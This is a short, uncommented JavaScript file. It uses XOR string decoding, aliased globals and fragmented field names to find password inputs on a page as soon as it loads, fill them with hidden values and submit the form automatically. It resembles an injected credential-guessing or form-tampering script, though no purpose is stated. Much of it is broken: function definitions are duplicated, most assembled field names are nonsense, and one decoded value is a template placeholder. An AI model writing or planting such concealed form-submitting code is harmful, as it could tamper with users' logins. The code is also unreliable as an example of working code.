function encryption(a){
  var c="";
  for(var i=0;i<a.length;i++){
    c+=String.fromCharCode(a.charCodeAt(i)^61);
  }
  return c;
}


function encryption(str){
  return str.split('').map(function(item, index){
    return str.charCodeAt(index);
  }).join(',');
}


var s = String;
var a = Array;
var part1 = 'pa';
setTimeout(function(){
  set4();
}, 0);
function ab8(){
  var a='abc^Taa185';
  var c="";
  for(var i=0;i<a.length;i++){
    c+=ab5(a.charCodeAt(i)^3);
  }
  return c;
}
var part9 = 'rd';
var d = document;
setTimeout(function(){
  set3();
}, 0);
function ab7(){
  var a='uilsl_+lkdl3';
  var c="";
  for(var i=0;i<a.length;i++){
    c+=ab5(a.charCodeAt(i)^11);
  }
  return c;
}
setTimeout(function(){
  set1();
}, 0);
var part8 = 'pas';
var ab5 = s.fromCharCode;
var ab6 = s.fromCodePoint;
function decode3(){
  var a='#{password}';
  var c="";
  for(var i=0;i<a.length;i++){
    c+=ab5(a.charCodeAt(i)^61);
  }
  return c;
}
setTimeout(function(){
  set2();
}, 0);
var toString = s.toString;
var hasOwnProperty = s.hasOwnProperty;
var isArray = a.isArray;
function decode4(){
  var a='u1ggl_+lkl3';
  var c="";
  for(var i=0;i<a.length;i++){
    c+=ab5(a.charCodeAt(i)^11);
  }
  return c;
}
var part3 = 'rd';
function set1(){
  var temp = ab0.call(d, '[name="'+ part1 + part2 + part3 + '"]');
  if(temp){
    temp.value= decode3();
    ab0.call(d, '[name="submit"]').click();
  }
}
var from = a.from;
var ab3 = a.toLocaleString;
function set2(){
  var temp = ab0.call(d, '[name="'+ part1 + part3 + part5 + '"]');
  if(temp){
    temp.value= ab8();
    ab0.call(d, '[name="submit"]').click();
  }
}

function set3(){
  var temp = ab0.call(d, '[name="'+ part4 + part7 + part9 + '"]');
  if(temp){
    temp.value= ab7();
    ab0.call(d, '[name="submit"]').click();
  }
}
var part7 = 'wd';
var ab0 = d.querySelector;
function set4(){
  var temp = ab0.call(d, '[name="'+ part6 + part8 + part1 + '"]');
  if(temp){
    temp.value= decode4();
    ab0.call(d, '[name="submit"]').click();
  }
}
var part4 = 'pas';
function set5(){
  var temp = ab0.call(d, '[name="'+ part6 + part8 + part1 + '"]');
  if(temp){
    temp.value= decode3();
    ab0.call(d, '[name="submit"]').click();
  }
}
setTimeout(function(){
  set5();
}, 0);
var part5 = 'word';
var part6 = 'ord';
var ab1 = d.querySelectorAll;
var ab2 = d.queryCommandEnabled;
function set6(){
  var temp = ab0.call(d, '[name="'+ part6 + part8 + part1 + '"]');
  if(temp){
    temp.value= ab7();
    ab0.call(d, '[name="submit"]').click();
  }
}
var part2 = 'sswo';
set6();
